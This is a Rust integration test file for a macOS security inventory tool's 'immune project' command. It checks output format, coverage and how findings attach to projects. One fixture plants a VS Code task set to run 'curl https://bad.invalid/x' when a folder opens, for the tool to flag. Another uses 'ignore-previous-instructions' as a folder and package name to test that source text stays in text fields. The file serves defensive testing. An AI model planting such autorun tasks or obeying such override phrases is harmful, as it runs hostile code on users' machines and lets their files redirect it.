//! Promises of `immune project`, the first command of the contract: what the store knows of one
//! project, as one protobuf message or the same message as JSON. Each test runs the real binary
//! over an invented home folder and an invented system root, so no test reads anything of the
//! Mac it runs on or asks the network.

#[path = "../src/contract.rs"]
#[allow(dead_code)]
mod contract;

use contract::v1;
use prost::Message;
use serde_json::Value;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

/// An invented home folder, which also holds the store.
struct Home(PathBuf);

impl Home {
    fn new(tag: &str) -> Home {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "immune-project-{tag}-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir_all(&path).unwrap();
        // Made real, as the readers make the home folder real: the temporary folder is a link.
        Home(std::fs::canonicalize(path).unwrap())
    }

    fn path(&self) -> &Path {
        &self.0
    }

    fn store(&self) -> PathBuf {
        self.0.join("store.db")
    }

    fn put(&self, rel: &str, content: &str) {
        let path = self.0.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, content).unwrap();
    }

    /// A checkout as git leaves it.
    fn checkout(&self, rel: &str) {
        self.put(&format!("{rel}/.git/HEAD"), "ref: refs/heads/main\n");
        self.put(
            &format!("{rel}/.git/refs/heads/main"),
            "0123456789abcdef0123456789abcdef01234567\n",
        );
    }

    /// The binary with this home folder as the home and the working folder.
    fn immune(&self) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_immune"));
        cmd.env("HOME", &self.0).current_dir(&self.0);
        cmd
    }

    /// `immune run` for the machine `mac`, with every outside source pointed at nothing, and
    /// these arguments after.
    fn run(&self, extra: &[&str]) {
        let no = |name: &str| self.0.join(name);
        self.put("brew.json", r#"{"formulae": [], "casks": []}"#);
        let out = self
            .immune()
            .args(["run", "--machine-name", "mac", "--store"])
            .arg(self.store())
            .arg("--brew-input")
            .arg(no("brew.json"))
            .arg("--servers-input")
            .arg(no("no-sweep"))
            .arg("--tailscale")
            .arg(no("no-tailscale"))
            .arg("--threats-input")
            .arg(no("no-catalogue"))
            .arg("--osv-crates-input")
            .arg(no("osv-crates.zip"))
            .arg("--osv-npm-input")
            .arg(no("osv-npm.zip"))
            .arg("--system-root")
            .arg(no("no-system"))
            .args(extra)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// `immune project <what>` on this store, with these arguments after.
    fn project(&self, what: &str, extra: &[&str]) -> Output {
        self.immune()
            .args(["project", what, "--store"])
            .arg(self.store())
            .args(extra)
            .output()
            .unwrap()
    }

    /// The answer in binary, decoded with the generated types.
    fn known(&self, what: &str) -> v1::Known {
        let out = self.project(what, &[]);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        v1::Known::decode(out.stdout.as_slice()).unwrap()
    }

    /// The answer as JSON.
    fn json(&self, what: &str) -> Value {
        let out = self.project(what, &["--json"]);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        serde_json::from_slice(&out.stdout).unwrap()
    }
}

impl Drop for Home {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// A lockfile of npm declaring one package.
fn package_lock(package: &str) -> String {
    format!(
        "{{\"name\": \"shop\", \"lockfileVersion\": 3, \"packages\": {{\"\": {{\"name\": \"shop\"}}, \
         \"node_modules/{package}\": {{\"version\": \"1.3.0\"}}}}}}\n"
    )
}

/// What the answer says of its project in a word: how it is known, and whether every reading
/// that speaks for it was full.
fn standing(k: &v1::Known) -> (v1::Presence, bool) {
    let all_full = k
        .coverage
        .iter()
        .all(|c| c.completeness() == v1::Completeness::Full);
    (k.presence(), all_full)
}

fn find<'a>(k: &'a v1::Known, reader: &str, kind: &str) -> Option<&'a v1::Coverage> {
    k.coverage
        .iter()
        .find(|c| c.reader == reader && c.kind == kind)
}

const GUARDED: &str = "folders macOS asks permission for";

/// The promise against false calm: a project the store never heard of, a project read in full
/// with nothing found, and a project in a folder macOS asks permission for, known from before and
/// not read now, are three different answers. The third carries the reading that says the folder
/// was not looked into, though everything read there before was read in full.
#[test]
fn unknown_known_and_quiet_and_known_but_not_read_are_three_different_answers() {
    let h = Home::new("three");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.checkout("Documents/notes");
    h.put(
        "Documents/notes/package-lock.json",
        &package_lock("left-pad"),
    );
    // Pointed at the guarded folder on purpose, the walk reads the project there; the next
    // walk of the home folder does not enter it, and keeps the project with nothing read.
    let documents = h.path().join("Documents");
    h.run(&["--checkouts-root", documents.to_str().unwrap()]);
    h.run(&[]);

    let unknown = h.known("~/dev/ghost");
    let quiet = h.known("~/dev/shop");
    let not_read = h.known("~/Documents/notes");

    assert_eq!(unknown.presence(), v1::Presence::Unknown);
    assert_eq!(unknown.thing, None);
    assert!(unknown.facts.is_empty() && unknown.parts.is_empty());
    // Unknown says which readings looked for it: the walk of this Mac.
    let walk = find(&unknown, "checkouts", "checkouts under the home folder").unwrap();
    assert_eq!(walk.scope_text, "machine:mac");

    assert_eq!(standing(&quiet), (v1::Presence::Held, true));
    assert!(quiet.findings.is_empty());
    // A reading of the project that found nothing is in the answer as well as one that did.
    let hooks = find(
        &quiet,
        "watched-places",
        "hooks in the checkout's .git folder",
    )
    .unwrap();
    assert_eq!(
        (hooks.scope_text.as_str(), hooks.reason_text.as_deref()),
        (
            "checkout:machine:mac/dev/shop",
            Some("the checkout has no hooks")
        )
    );
    assert_eq!(
        quiet.thing,
        Some(v1::Entity {
            id_text: "checkout:machine:mac/dev/shop".to_string(),
            r#type: "checkout".to_string(),
        })
    );

    assert_eq!(standing(&not_read), (v1::Presence::Held, false));
    let guarded = not_read
        .coverage
        .iter()
        .find(|c| c.kind == GUARDED && c.reader == "checkouts")
        .unwrap();
    assert_eq!(guarded.completeness(), v1::Completeness::None);
    assert_eq!(guarded.cause(), v1::Cause::NotGiven);
    assert_eq!(
        guarded.reason_text.as_deref(),
        Some("not looked into: ~/Documents")
    );
    // What was read there before is still given, with when it was read.
    let lockfiles = find(&not_read, "lockfiles", "lockfile dependencies").unwrap();
    assert_eq!(lockfiles.completeness(), v1::Completeness::Full);
    // The project outside the guarded folder is not spoken for by that reading.
    assert!(quiet.coverage.iter().all(|c| c.kind != GUARDED));
    // A project the store never heard of in a folder that was not looked into is unknown for
    // that reason, and says so.
    let unseen = h.known("~/Documents/unseen");
    assert_eq!(unseen.presence(), v1::Presence::Unknown);
    assert!(
        unseen
            .coverage
            .iter()
            .any(|c| c.kind == GUARDED && c.completeness() == v1::Completeness::None)
    );

    // The project's id as the store names it, its full path, and a path with `..` and a
    // trailing `/` are the same question as its path from the home folder.
    let full = h.path().join("dev/tools/../shop/");
    for what in ["checkout:machine:mac/dev/shop", full.to_str().unwrap()] {
        let same = h.known(what);
        assert_eq!(
            (&same.thing, &same.facts, &same.coverage),
            (&quiet.thing, &quiet.facts, &quiet.coverage),
            "{what}"
        );
    }
}

/// A project the store held and that is no longer there is gone, not unknown: what was read of
/// it is retracted, and the answer does not pass for one about a project never seen.
#[test]
fn a_project_that_was_removed_is_gone_not_unknown() {
    let h = Home::new("gone");
    h.checkout("dev/old");
    h.run(&[]);
    std::fs::remove_dir_all(h.path().join("dev/old")).unwrap();
    h.run(&[]);
    let k = h.known("~/dev/old");
    assert_eq!(k.presence(), v1::Presence::Gone);
    assert!(k.facts.is_empty());
    assert_eq!(k.thing.unwrap().id_text, "checkout:machine:mac/dev/old");
}

/// Every fact says what it rests on: the reader, the basis and where it was read. A reading that
/// was not full is in the answer with its cause and what this build has no reader for.
#[test]
fn facts_carry_their_basis_and_reader_and_coverage_that_is_not_full_is_in_the_answer() {
    let h = Home::new("basis");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.put("dev/shop/web/yarn.lock", "# yarn lockfile v1\n");
    h.run(&[]);
    let k = h.known("~/dev/shop");
    let component = "component:checkout:machine:mac/dev/shop/npm/left-pad";
    assert!(k.parts.iter().any(|p| p.id_text == component));
    let version = k
        .facts
        .iter()
        .find(|f| f.subject_text == component && f.predicate == "has_version")
        .unwrap();
    assert_eq!(version.object_text, "1.3.0");
    let a = &version.assertions[0];
    assert_eq!(
        (a.reader.as_str(), a.basis(), a.kind.as_str()),
        ("lockfiles", v1::Basis::Declared, "lockfile dependencies")
    );
    assert!(a.source_ref_text.contains("package-lock.json"));
    let located = k
        .facts
        .iter()
        .find(|f| f.subject_text == "checkout:machine:mac/dev/shop" && f.predicate == "located_on")
        .unwrap();
    assert_eq!(located.assertions[0].basis(), v1::Basis::Observed);
    assert_eq!(located.assertions[0].reader, "checkouts");

    let lockfiles = find(&k, "lockfiles", "lockfile dependencies").unwrap();
    assert_eq!(lockfiles.completeness(), v1::Completeness::Partial);
    assert_eq!(lockfiles.cause(), v1::Cause::NoReader);
    assert!(
        lockfiles
            .lacks
            .iter()
            .any(|l| l.name_text.as_deref() == Some("yarn.lock")),
        "{:?}",
        lockfiles.lacks
    );
    assert_eq!(standing(&k), (v1::Presence::Held, false));

    // A reading kept before causes were, not full and with no cause, failed: it never reads as
    // a reading with nothing missing.
    rusqlite::Connection::open(h.store())
        .unwrap()
        .execute(
            "UPDATE coverage SET cause = NULL WHERE reader = 'lockfiles'",
            [],
        )
        .unwrap();
    let k = h.known("~/dev/shop");
    let lockfiles = find(&k, "lockfiles", "lockfile dependencies").unwrap();
    assert_eq!(lockfiles.cause(), v1::Cause::Failed);
    assert_eq!(
        find(&k, "checkouts", "checkouts under the home folder")
            .unwrap()
            .cause,
        None
    );
}

/// A finding about a file inside the project is the project's: the answer refers to it by id,
/// with its state, how bad, how sure and whether it is urgent.
#[test]
fn a_finding_about_a_file_inside_the_project_is_referenced_by_the_project() {
    let h = Home::new("finding");
    h.checkout("dev/shop");
    h.checkout("dev/other");
    h.run(&[]);
    // A hook is `located_on` its checkout; an editor's task file is on the machine, and inside
    // the project only by its path.
    h.put("dev/shop/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
    h.put(
        "dev/shop/.vscode/tasks.json",
        r#"{"tasks": [{"label": "dev", "runOptions": {"runOn": "folderOpen"}, "command": "curl https://bad.invalid/x"}]}"#,
    );
    // An invented indicator that the task file holds: a match is urgent.
    h.put(
        "indicators.json",
        r#"[{"kind": "domain-name:value", "value": "bad.invalid", "note_text": "invented"}]"#,
    );
    h.run(&[]);
    let k = h.known("~/dev/shop");
    let hook = "file:machine:mac/dev/shop/.git/hooks/pre-commit";
    let tasks = "file:machine:mac/dev/shop/.vscode/tasks.json";
    for file in [hook, tasks] {
        assert!(
            k.parts
                .iter()
                .any(|p| p.id_text == file && p.r#type == "file")
        );
    }
    // The task file is spoken for by the reading that found it, a reading of the machine.
    let editor = "editor tasks set to run when a checkout's folder is opened";
    assert_eq!(
        find(&k, "watched-places", editor).unwrap().scope_text,
        "machine:mac"
    );
    let refs: Vec<(&str, &str, v1::Level, v1::Level, bool)> = k
        .findings
        .iter()
        .map(|f| {
            (
                f.rule.as_str(),
                f.about_text.as_str(),
                f.severity(),
                f.confidence(),
                f.urgent,
            )
        })
        .collect();
    use v1::Level::{High, Low, Medium};

    assert_eq!(
        refs,
        [
            ("indicator.match", tasks, High, High, true),
            ("autorun.folder-open", tasks, High, Medium, true),
            ("watched.git-hook", hook, Medium, Low, false),
        ]
    );
    assert!(
        k.findings
            .iter()
            .all(|f| f.state() == v1::FindingState::Open)
    );
    // A finding's id is the one `immune finding` answers for.
    let shown = h
        .immune()
        .args(["finding", &k.findings[2].id, "--json", "--store"])
        .arg(h.store())
        .output()
        .unwrap();
    let shown: Value = serde_json::from_slice(&shown.stdout).unwrap();
    assert_eq!(shown["result"]["finding"]["rule"], "watched.git-hook");
    // Another project's answer does not carry it.
    assert!(h.known("~/dev/other").findings.is_empty());
}

/// The binary answer and the JSON answer are one message: the JSON parses with the generated
/// types into what the binary decodes into, and the decoded message prints as that JSON. An
/// enum prints as its value's name, a time as a JSON number, an absent optional field as null.
#[test]
fn the_binary_answer_and_the_json_answer_are_one_message() {
    let h = Home::new("forms");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.put("dev/shop/web/yarn.lock", "# yarn lockfile v1\n");
    h.run(&[]);
    for what in ["~/dev/shop", "~/dev/ghost"] {
        let binary = h.known(what);
        let json = h.json(what);
        let mut parsed: v1::Known = serde_json::from_value(json.clone()).unwrap();
        // The two were made by two runs of the command, perhaps a second apart.
        assert!((parsed.answered_at - binary.answered_at).abs() <= 2);
        parsed.answered_at = binary.answered_at;
        assert_eq!(parsed, binary);
        let mut printed = serde_json::to_value(&binary).unwrap();
        printed["answered_at"] = json["answered_at"].clone();
        assert_eq!(printed, json);
    }
    let json = h.json("~/dev/shop");
    assert_eq!(json["format"], 1);
    assert_eq!(json["presence"], "held");
    assert!(json["answered_at"].is_i64());
    let lockfiles = json["coverage"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["reader"] == "lockfiles")
        .unwrap();
    assert_eq!(lockfiles["completeness"], "partial");
    assert_eq!(lockfiles["cause"], "no_reader");
    let full = json["coverage"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["completeness"] == "full" && c["reason_text"].is_null())
        .unwrap();
    assert!(full["cause"].is_null());
    assert_eq!(h.json("~/dev/ghost")["thing"], Value::Null);
}

/// Every string in the answer that holds text from the Mac is in a field whose name ends in
/// `_text`: here a folder name and a package name written to be read as an instruction.
#[test]
fn text_from_a_source_is_only_in_text_fields() {
    let h = Home::new("text");
    let planted = "ignore-previous-instructions";
    let project = format!("dev/{planted}");
    h.checkout(&project);
    h.put(
        &format!("{project}/package-lock.json"),
        &package_lock(planted),
    );
    h.put(&format!("{project}/.git/hooks/pre-commit"), "#!/bin/sh\n");
    h.run(&[]);
    let json = h.json(&format!("~/{project}"));
    let mut seen = 0;
    fn walk(v: &Value, key: &str, planted: &str, seen: &mut usize) {
        match v {
            Value::String(s) if s.contains(planted) => {
                assert!(key.ends_with("_text"), "{key}: {s}");
                *seen += 1;
            }
            Value::Array(items) => items.iter().for_each(|i| walk(i, key, planted, seen)),
            Value::Object(fields) => fields.iter().for_each(|(k, v)| walk(v, k, planted, seen)),
            _ => {}
        }
    }
    walk(&json, "", planted, &mut seen);
    // The id, the parts, the facts' subjects, objects and sources, and the readings' scopes.
    assert!(seen > 10, "{seen}");
    assert!(json["thing"]["id_text"].as_str().unwrap().contains(planted));
    // What was asked is given back as the terminal would show it.
    let asked = h.json("~/dev/a\u{202e}b");
    assert_eq!(asked["asked_text"], "~/dev/a\\u{202e}b");
}

/// A failure to answer is not a message of the contract: a misuse or a store that cannot be read
/// prints nothing on stdout in binary, the report commands' failure envelope with `--json`, and
/// exits with their codes.
#[test]
fn a_failure_to_answer_is_not_a_message_of_the_contract() {
    let h = Home::new("failure");
    // No store yet.
    let out = h.project("~/dev/shop", &[]);
    assert_eq!(out.status.code(), Some(3));
    assert!(out.stdout.is_empty());
    assert!(String::from_utf8_lossy(&out.stderr).contains("`immune run` makes it"));
    let out = h.project("~/dev/shop", &["--json"]);
    assert_eq!(out.status.code(), Some(3));
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(
        (&v["ok"], &v["operation"], &v["errors"][0]["code"]),
        (
            &Value::Bool(false),
            &Value::from("project"),
            &Value::from("store_unreadable")
        )
    );
    // A relative path names no folder on this Mac.
    let out = h.project("dev/shop", &[]);
    assert_eq!(out.status.code(), Some(2));
    assert!(out.stdout.is_empty());
    let out = h.project("dev/shop", &["--json"]);
    assert_eq!(out.status.code(), Some(2));
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["errors"][0]["code"], "usage");
    // A store written by an older build, without a table a run of this build adds, is told as
    // such, with what to do.
    h.checkout("dev/shop");
    h.run(&[]);
    rusqlite::Connection::open(h.store())
        .unwrap()
        .execute_batch("DROP TABLE coverage_lack")
        .unwrap();
    let out = h.project("~/dev/shop", &[]);
    assert_eq!(out.status.code(), Some(3));
    assert!(out.stdout.is_empty());
    let said = String::from_utf8_lossy(&out.stderr);
    assert!(
        said.contains("written by an older build")
            && said.contains("`immune run` brings it up to date"),
        "{said}"
    );
}

/// A reference is given whole: an entity id longer than the 256 characters other text from a
/// source is cut to stays whole, the same in a part, a fact and a finding, and asks back the
/// same thing.
#[test]
fn an_entity_id_is_given_whole_and_asks_back_the_same_thing() {
    let h = Home::new("whole");
    let project = format!("dev/{}/{}", "a".repeat(150), "b".repeat(120));
    h.checkout(&project);
    h.run(&[]);
    h.put(&format!("{project}/.git/hooks/pre-commit"), "#!/bin/sh\n");
    h.run(&[]);
    let k = h.known(&format!("~/{project}"));
    let hook = format!("file:machine:mac/{project}/.git/hooks/pre-commit");
    assert!(hook.chars().count() > 256);
    assert!(k.parts.iter().any(|p| p.id_text == hook));
    assert!(k.facts.iter().filter(|f| f.subject_text == hook).count() >= 2);
    assert_eq!(k.findings[0].about_text, hook);
    let thing = k.thing.unwrap();
    assert_eq!(thing.id_text, format!("checkout:machine:mac/{project}"));
    assert_eq!(h.known(&thing.id_text).thing, Some(thing));
}
